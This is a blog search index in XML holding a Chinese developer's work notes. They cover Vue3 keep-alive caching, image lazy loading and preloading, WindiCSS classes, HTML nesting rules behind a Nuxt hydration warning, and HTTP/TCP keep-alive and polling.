<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>项目性能优化之缓存和懒加载</title>
      <link href="/workNotes/work/12%20%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%E7%BC%93%E5%AD%98%E5%92%8C%E5%9B%BE%E7%89%87%E6%87%92%E9%A2%84%E5%8A%A0%E8%BD%BD"/>
      <url>/workNotes/work/12%20%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%E7%BC%93%E5%AD%98%E5%92%8C%E5%9B%BE%E7%89%87%E6%87%92%E9%A2%84%E5%8A%A0%E8%BD%BD</url>
      
        <content type="html"><![CDATA[<ol><li><p>在页面跳转的情况下，还是会有资源重新加载的情况，所以使用了 keep-alive</p><ol><li><p>在 router.js 增加允许使用 keep-alive</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&quot;./components/Home.vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">List</span> <span class="keyword">from</span> <span class="string">&quot;./components/List.vue&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> router = <span class="title class_">VueRouter</span>.<span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>: <span class="title class_">VueRouter</span>.<span class="title function_">createWebHashHistory</span>(),</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">Home</span>,</span><br><span class="line">      <span class="attr">meta</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;home&quot;</span>,</span><br><span class="line">        <span class="attr">requiresAuth</span>: <span class="literal">true</span>, <span class="comment">//</span></span><br><span class="line">        <span class="attr">keepAlive</span>: <span class="literal">true</span>, <span class="comment">// 允许使用缓存</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&quot;/list/:category&quot;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">List</span>,</span><br><span class="line">      <span class="attr">meta</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;list&quot;</span>,</span><br><span class="line">        <span class="attr">requiresAuth</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">keepAlive</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure></li><li><p>在 app.js 使用 keep-alive</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- vue3 写法 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123; Component &#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">v-if</span>=<span class="string">&quot;$route.meta.keepAlive&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;Component&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">component</span> <span class="attr">v-if</span>=<span class="string">&quot;!$route.meta.keepAlive&quot;</span> <span class="attr">:is</span>=<span class="string">&quot;Component&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- vue2 写法 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span> <span class="attr">v-if</span>=<span class="string">&quot;$route.meta.keepAlive&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span> <span class="attr">v-if</span>=<span class="string">&quot;!$route.meta.keepAlive&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><blockquote><p><font color="red">如果第一个方法没有效果的话，那么要结合第二个看</font></p></blockquote><ol start="2"><li><p>路由回退中 router.go() 与 router.back()</p><blockquote><p><a href="https://blog.csdn.net/qq_42618566/article/details/91045282">https://blog.csdn.net/qq_42618566/article/details/91045282</a></p></blockquote><ul><li><code>go()</code> 原页面表单中的内容会丢失</li><li><code>back()</code> 原页面表单中的内容会保留<ul><li><code>back()</code> 后退</li><li><code>back(0)</code> 刷新</li><li><code>back(1)</code> 前进</li></ul></li></ul></li><li><p>使用 keep-alive，第二次跳转页面后 不会 触发到原先在 onMounted 的 使页面到顶部，就会保持上个页面滚动条的滚动情况</p><ul><li>在 onActived 写一个与 onMounted 一样的逻辑</li><li>页面第一次进入的时候，钩子触发的顺序是 created-&gt;mounted-&gt;activated，所以别在 mounted 和 activated 方法中写相同的逻辑代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onActivated</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> = <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">pageYOffset</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">pageYOffset</span> = <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>图片懒加载</p><ul><li><p>原理：将图片的 url 放在 <code>&lt;img src=&quot;&quot; :data-src=&quot;url&quot; /&gt;</code> 的 data-src 里，当图片位于用户可视区时就将 url 放到 src 属性里</p></li><li><p>判断图片是否位于可视区的方法:</p><ol><li>scroll 事件监听，用 scrollTop 等属性计算位置判断</li><li>使用 Intersection Observer</li><li>Intersection Observer<blockquote><p><a href="https://juejin.cn/post/7080544007834730510">https://juejin.cn/post/7080544007834730510</a> 这篇文章挺全面的</p></blockquote></li></ol></li><li><p>解决方法</p><blockquote><p>因为 项目是 vue3 + vant，所以使用 vant 自带的 <code>&lt;van-image lazy-load&gt;&lt;/van-image&gt;</code></p></blockquote></li></ul></li><li><p>图片懒加载的前提下，在右滑 or 轮播图切换，及非垂直滚动时做图片预加载，增加用户体验</p><ul><li><p>原理均类似于懒加载的原理，因为图片地址在 src 属性里时，页面就会自动加载图片资源了</p></li><li><p><strong>轮播</strong>原理：在当前图片轮播时，就将下一张图片给加载出来，这部分是取消了懒加载啦</p></li><li><p>实现:</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;w-100vw h-full relative&quot;</span> <span class="attr">:src</span>=<span class="string">&quot;realPic[index]&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 轮播图 图片懒加载</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * imgs: 配置文件中的 banner 图片的链接</span></span><br><span class="line"><span class="comment"> * realPic: 真正页面使用的图片的链接</span></span><br><span class="line"><span class="comment"> * changePic: 轮播图 图片切换的时候触发函数，预先加载后一个图片</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> imgs = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> board_1) &#123;</span><br><span class="line">  imgs.<span class="title function_">push</span>(item.<span class="property">banner</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> realPic = <span class="title function_">reactive</span>([imgs[<span class="number">0</span>], imgs[<span class="number">1</span>]]);</span><br><span class="line"><span class="keyword">let</span> count = <span class="title function_">ref</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> changePic = <span class="title function_">limit</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">  img.<span class="property">src</span> = imgs[count.<span class="property">value</span>];</span><br><span class="line">  <span class="keyword">if</span> (img.<span class="property">complete</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count.<span class="property">value</span> &lt; imgs.<span class="property">length</span>) &#123;</span><br><span class="line">    realPic.<span class="title function_">push</span>(imgs[count.<span class="property">value</span>]);</span><br><span class="line">    count.<span class="property">value</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// console.log(realPic);</span></span><br><span class="line">&#125;, imgs.<span class="property">length</span> - count.<span class="property">value</span>);</span><br></pre></td></tr></table></figure><ul><li><p><strong>右滑</strong>原理：所以在需要预加载的图片的 src 为 一个图片数组，初始情况下，数组为空，在懒加载的图片加载完成后就把该数组用 图片 src 填满</p></li><li><p>实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;index &lt; 4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">van-image</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:src</span>=<span class="string">&quot;item.banner&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">class</span>=<span class="string">&quot;w-full h-full&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">lazy-load</span></span></span><br><span class="line"><span class="tag">    @<span class="attr">load</span>=<span class="string">&quot;load(index)&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">van-image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">van-image</span> <span class="attr">:src</span>=<span class="string">&quot;preimg[index]&quot;</span> <span class="attr">class</span>=<span class="string">&quot;w-full h-full&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">van-image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> preimg = <span class="title function_">reactive</span>([]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> load = <span class="title function_">limit</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; board_2.<span class="property">list</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    preimg.<span class="title function_">push</span>(board_2.<span class="property">list</span>[i].<span class="property">banner</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>计算首屏时间</p><blockquote><p><a href="https://blog.csdn.net/weixin_40599109/article/details/108622434">https://blog.csdn.net/weixin_40599109/article/details/108622434</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = performance.<span class="property">timing</span>;</span><br><span class="line"><span class="keyword">var</span> pageLoadTime = t.<span class="property">loadEventEnd</span> - t.<span class="property">navigationStart</span>;</span><br><span class="line"><span class="comment">// 在这里pageLoadTime就是首屏时间</span></span><br></pre></td></tr></table></figure></li><li><p>在进入同一个有 keepalive 的组件，但是要展示不同数据时，就要合理修改 reactive 的值</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vite </tag>
            
            <tag> vue3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录 windicss 使用过程中遇到的属性</title>
      <link href="/workNotes/work/11%20vite%20vue3%20windicss%20backgroundImage"/>
      <url>/workNotes/work/11%20vite%20vue3%20windicss%20backgroundImage</url>
      
        <content type="html"><![CDATA[<ol><li><p>常规使用</p><p><strong>文字 背景</strong></p><ul><li>font-size — text-[12px]</li><li>font-weight — font-[500]</li><li>line-height — leading-[14px]</li><li>color — text-[#5E6673]</li><li>background — bg-[#1A2437]</li><li>opacity — opacity-60</li><li>文本溢出 — line-clamp-3</li></ul><p><strong>盒子模型</strong></p><ul><li>padding — px(横向) py(纵向) pt pb pl pr</li><li>margin</li><li>width — w</li><li>height — h</li><li>圆角边框 — rounded-[4px]</li></ul><p><strong>定位</strong></p><ul><li>position — relative/absolute</li><li>display — block/flex</li><li>flex — flex-col/justify-between/flex-grow-0/items-center</li><li>z-index — z-index-1</li></ul></li></ol><ul><li>first-of-type:mt-0</li></ul><ol start="2"><li><p>使用 backgroundImage 做渐变失效的解决方案</p><ol><li>在 <code>windi.config.js</code> 文件中添加</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extend</span>: &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="attr">backgroundImage</span>: &#123;</span><br><span class="line">      <span class="string">&quot;gradient-61&quot;</span>:</span><br><span class="line">        <span class="string">&quot;linear-gradient(184.29deg, rgba(0, 0, 0, 0) 3.48%, rgba(0, 0, 0, 0.8) 96.51%)&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li>在 vue 中使用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;bg-gradient-61&quot; &gt;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vite </tag>
            
            <tag> vue3 </tag>
            
            <tag> windicss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html 标签嵌套规则</title>
      <link href="/workNotes/work/10%20xhtml%20%E6%A0%87%E7%AD%BE%E5%B5%8C%E5%A5%97%E8%A7%84%E5%88%99"/>
      <url>/workNotes/work/10%20xhtml%20%E6%A0%87%E7%AD%BE%E5%B5%8C%E5%A5%97%E8%A7%84%E5%88%99</url>
      
        <content type="html"><![CDATA[<blockquote><p>由 [nuxtjs 开发 spa](./10 nuxtjs <a href="http://xn--4ru063i.md">报错.md</a>) 引申出的思考</p><p>参考链接：<br><a href="https://cloud.tencent.com/developer/article/1009200">https://cloud.tencent.com/developer/article/1009200</a></p><p><a href="https://cloud.tencent.com/developer/article/1484900">https://cloud.tencent.com/developer/article/1484900</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/HTML/Content_categories">https://developer.mozilla.org/zh-CN/docs/Web/Guide/HTML/Content_categories</a></p></blockquote><blockquote><p>其实第一个参考链接的图片已经讲的很清楚了，那我就大概总结一下吧</p></blockquote><ol><li><p>块级元素可以嵌套 块级/行内元素</p><ul><li>其中 <code>&lt;h1&gt;～&lt;h6&gt;</code> <code>&lt;dt&gt;</code> 只能嵌套行内元素</li><li>其中 <code>&lt;p&gt;</code> 可以嵌套 <code>&lt;p&gt;</code> 和 行内元素</li></ul></li><li><p>行内元素 只可以嵌套行内元素</p><ul><li>其中 <code>&lt;a&gt;</code> 可以嵌套除了 <code>&lt;a&gt;</code> 以外的几乎所有元素，包括行内和块级元素</li></ul></li><li><p>块级元素 与 块级元素 并列，行内元素 与 行内元素 并列</p></li></ol><blockquote><p>在使用 nuxtjs 配合 vue 开发的时候，报 <code>[vue warn]</code>的情况，只有 <code>&lt;a&gt; &lt;a&gt;&lt;/a&gt; &lt;/a&gt;</code>，及 a 标签 嵌套 a 标签才会出现，为啥捏？还没有搞懂…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nuxtjs 开发 spa 遇上的有关 html 标签规则的报错</title>
      <link href="/workNotes/work/10%20nuxtjs%E6%8A%A5%E9%94%99"/>
      <url>/workNotes/work/10%20nuxtjs%E6%8A%A5%E9%94%99</url>
      
        <content type="html"><![CDATA[<blockquote><p>博客上线前，老大发现的 [vue warn], 说 “博客详情服务器渲染有问题”、“这个在正式环境会执行错误的”、“沙盒应该就会无法渲染”、“ssr 和 spa 渲染结果不一样”…</p><p>触发报错的操作: “在博客详情页直接刷新 就会提示我截图的错误”</p></blockquote><h3 id="报错信息:">报错信息:<a title="#报错信息:" href="#报错信息:"></a></h3><p>[Vue warn]: The client-side rendered virtual DOM tree is not matching server-rendered content. This is likely caused by incorrect HTML markup, for example nesting block-level elements inside <code>&lt;p&gt;</code>, or missing <code>&lt;tbody&gt;</code>. Bailing hydration and performing full client-side render.</p><h3 id="报错截图：">报错截图：<a title="#报错截图：" href="#报错截图："></a></h3><img src="https://s1.ax1x.com/2022/04/20/Ls48OK.png"><blockquote><p>大概意思是 HTML 结构嵌套不正确，会导致 srr 渲染的页面跟csr的不一样<br>根据黄色提示，我很快就定位到了代码的位置</p></blockquote><h3 id="报错效果图及其-html-标签:">报错效果图及其 html 标签:<a title="#报错效果图及其-html-标签:" href="#报错效果图及其-html-标签:"></a></h3><img src="https://s1.ax1x.com/2022/04/20/LsI3VO.jpg"><p>最外层的<code>&lt;a class=&quot;pre item&quot;&gt;</code></p><blockquote><p>本来最外层的 <code>&lt;a&gt;</code> 是 <code>&lt;p&gt;</code> 的，但是因为里面的两个 <code>&lt;a&gt;</code> 标签都是跳转同一个链接，所以我就直接把最外层改了，虽然我记得这样嵌套不行，但是我以为没影响！</p></blockquote><blockquote><p>我不知道为什么上个同学要分开写两个? 难道是因为分开 <code>hover</code> 改变样式? 如果有大佬知道分开写的好处, d 我!!! 我很感兴趣!!!</p></blockquote><h3 id="报错解决">报错解决<a title="#报错解决" href="#报错解决"></a></h3><p>因为 html 标签嵌套规则里面有提到 <code>&lt;a&gt;</code> 标签可以嵌套<strong>除本身以外</strong>的块级元素、行内元素，所以直接把里面的两个 <code>&lt;a&gt;</code> 改成其他标签，如 <code>&lt;span&gt;</code> 就解决问题啦！</p>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
            <tag> nuxtjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http 与 tcp keep-alive 的区别</title>
      <link href="/furtherNotes/further/01%20http%20tcp%20keepalive"/>
      <url>/furtherNotes/further/01%20http%20tcp%20keepalive</url>
      
        <content type="html"><![CDATA[<blockquote><p>根据 连接轮询扩展</p><p>参考链接:</p><p><a href="https://www.jianshu.com/p/95af6727bf6c">https://www.jianshu.com/p/95af6727bf6c</a></p><p><a href="https://www.jianshu.com/p/cb36364ee099">https://www.jianshu.com/p/cb36364ee099</a>   – 详细</p></blockquote><h2 id="http-keep-alive">HTTP keep-alive<a title="#http-keep-alive" href="#http-keep-alive"></a></h2><blockquote><p>决定tcp连接是长连接还是短连接</p></blockquote><ul><li>HTTP是基于TCP传输协议实现的，<strong>客户端与服务段要进行HTTP连接前，需要先建立TCP连接</strong>，然后客户端发送HTTP请求，服务端收到后就返回响应，至此[请求-应答]完成，随后释放连接。</li></ul><ul><li><p>HTTP短连接：每次请求都经历一个建立TCP的连接。一次连接只能请求一次资源。</p></li><li><p>HTTP长连接：HTTP的keepalive实现了这个功能，可以使用同一个TCP连接来发送和接受多个HTTP请求/应答，避免连接建立释放的过程造成的资源消耗</p></li></ul><ul><li>特点：只要任意一端没有明确提出断开连接，则保持TCP连接。</li><li>为了避免资源浪费的情况，web服务器会提供超时连接的参数，用来指定HTTP长连接的超时时间。</li></ul><h2 id="tcp-keep-alive">TCP keep-alive<a title="#tcp-keep-alive" href="#tcp-keep-alive"></a></h2><ul><li><p>是由TCP内核层实现的，称为<strong>TCP的保活机制</strong></p></li><li><p>定义在一个时间段，在这个时间段内，如果<strong>没有任何连接</strong>的相关活动，<strong>TCP保活机制会开始作用</strong> —— 每隔一个时间段，发送一个探测报文，该探测报文包含的数据非常少，<strong>如果连续几个探测报文都没有得到响应，则认为当前的TCP连接已经死亡</strong>，系统内核将错误信息通知上层应用程序。</p></li><li><p>如果对端程序是正常工作的。当TCP保活的探测报文发送给对端，对端会正常响应，这样TCP保活时间会被重置，等待下一个TCP保活时间的到来。</p></li><li><p>如果对端程序崩溃，或对端由于其他原因导致报文不可达。当TCP保活的探测报文发送给对端后，石沉大海，没有响应，连续几次，达到保活探测次数后，TCP会报告该TCP连接已死亡。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长连接短链接 长轮询短轮询</title>
      <link href="/furtherNotes/further/01%20tcp%E9%95%BF%E7%9F%AD%E8%BF%9E%E6%8E%A5%E8%BD%AE%E8%AF%A2"/>
      <url>/furtherNotes/further/01%20tcp%E9%95%BF%E7%9F%AD%E8%BF%9E%E6%8E%A5%E8%BD%AE%E8%AF%A2</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：<a href="https://www.jianshu.com/p/3fc3646fad80">https://www.jianshu.com/p/3fc3646fad80</a></p></blockquote><h2 id="短链接">短链接<a title="#短链接" href="#短链接"></a></h2><p>http1.0</p><p>每次http连接都要经历：发送请求 -&gt; 建立tcp连接 -&gt; 传输数据 -&gt; 关闭tcp连接</p><h2 id="长连接">长连接<a title="#长连接" href="#长连接"></a></h2><p>http1.1</p><p>http connection = keep-alive，发送请求 -&gt; 建立tcp长连接 -&gt; 传输所有http请求及其响应数据 -&gt; 在超时时间内 如果没有请求发送的话就断开连接</p><blockquote><p>HTTP协议说到底是应用层的协议，而TCP才是真正的传输层协议，只有负责传输的这一层才需要建立连接。</p><p>所以长短连接是指 tcp 连接</p></blockquote><p><strong>Q1</strong> 是不是只要设置Connection为keep-alive就算是长连接了？</p><p><strong>A1</strong> 是的，但要服务器和客户端都设置。</p><blockquote><p>都说HTTP1.1默认是长连接，而观察我们平时开发的Web应用的HTTP头部，Connection也确实是keep-alive，那就是说我们大部分都是用的长连接</p></blockquote><p><strong>Q2</strong> 我们平时用的是不是长连接？</p><p><strong>A2</strong> 是的。（现在用的基本上都是HTTP1.1协议，你观察一下就会发现，基本上<strong>Connection都是keep-alive</strong>。而且HTTP协议文档上也提到了，HTTP1.1默认是长连接，也就是默认Connection的值就是keep-alive）</p><p><strong>Q3</strong> 这种普通的Web应用（比如博客园，我的个人博客这种）用长连接有什么好处？需不需要关掉长连接而使用短连接？</p><p><strong>A3</strong>  长连接是为了复用TCP连接，也就是说，长连接情况下，<strong>多个HTTP请求可以</strong>复用同一个TCP连接，这就节省了很多TCP连接建立和断开的消耗。</p><p>比如你请求了博客园的一个网页，这个网页里肯定还包含了CSS、JS等等一系列资源，如果你是短连接（也就是每次都要重新建立TCP连接）的话，那<strong>你每打开一个网</strong>页，基本<strong>要建立几个甚至几十个TCP连接</strong>，这浪费了多少资源就不用LZ去说了吧。</p><p>但如果是长连接的话，那么这么<strong>多次HTTP请求</strong>（这些请求包括请求网页内容，CSS文件，JS文件，图片等等），其实<strong>使用的都是一个TCP连接</strong>，很显然是可以节省很多消耗的。</p><p>长连接并不是永久连接的。如果一段时间内（具体的时间长短，是可以在header当中进行设置的，也就是所谓的<strong>超时时间</strong>），这个<strong>连接没有HTTP请求发出的话，那么这个长连接就会被断掉</strong>。</p><blockquote><p>首先长连接是为了复用，比如说在请求这个博客的时候，建立了一条tcp连接，在传输完一个html文件后，连接就关闭了，如果还有后续的css文件就需要再开启一个tcp连接，but 如果用了长连接，再与改网站有关的资源还没传输完的时候一直保持着改连接，</p></blockquote><h2 id="短轮询">短轮询<a title="#短轮询" href="#短轮询"></a></h2><p>在一个需要实时更新数据的地方，比如说商品库存量:</p><p>用JS写个死循环，<strong>不停的去请求服务器中的库存量是多少，然后刷新到这个页面当中</strong>，这其实就是所谓的短轮询。<strong>短轮询去服务端查询的时候，不管库存量有没有变化，服务器就立即返回结果了。</strong></p><p>坏处：那就是你很浪费服务器和客户端的资源，如果有1000个人停留在某个商品详情页面，那就是说会有1000个客户端不停的去请求服务器获取库存量，这显然是不合理的。</p><blockquote><p>短轮询就是在不停得向后端发送请求查询库存量，后端每次都返回当前数据库的值给前端</p><p>如果在很多用户都看这个页面时，后台就要返回很多数据</p></blockquote><h2 id="长轮询">长轮询<a title="#长轮询" href="#长轮询"></a></h2><p>在一个需要实时更新数据的地方，比如说商品库存量:</p><p>其实长轮询和短轮询最大的区别是，短轮询去服务端查询的时候，不管库存量有没有变化，服务器就立即返回结果了。而长轮询则不是，在长轮询中**，服务器如果检测到库存量没有变化的话，将会把当前请求挂起<strong>一段时间（这个时间也叫作</strong>超时时间**，一般是几十秒）。在这个时间里，<strong>服务器会去检测库存量有没有变化，检测到变化就立即返回，否则就一直等到超时为止。</strong></p><blockquote><p>长轮询就是发送一个查询库存量的请求，但是后端是在数据库变化的时候才返回给前端</p></blockquote><h2 id="轮询和连接的区别">轮询和连接的区别<a title="#轮询和连接的区别" href="#轮询和连接的区别"></a></h2><ol><li><p><strong>决定的方式</strong>，</p><p>一个TCP连接是否为长连接，是通过设置<strong>HTTP的Connection Header</strong>来决定的，而且是需要<strong>两边都设置</strong>才有效。</p><p>而一种轮询方式是否为长轮询，是根据<strong>服务端的处理方式</strong>来决定的，与客户端没有关系。</p></li><li><p><strong>实现的方式</strong>，</p><p>连接的长短是通过<strong>协议</strong>来规定和实现的。</p><p>而轮询的长短，是<strong>服务器通过编程</strong>的方式手动挂起请求来实现的。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
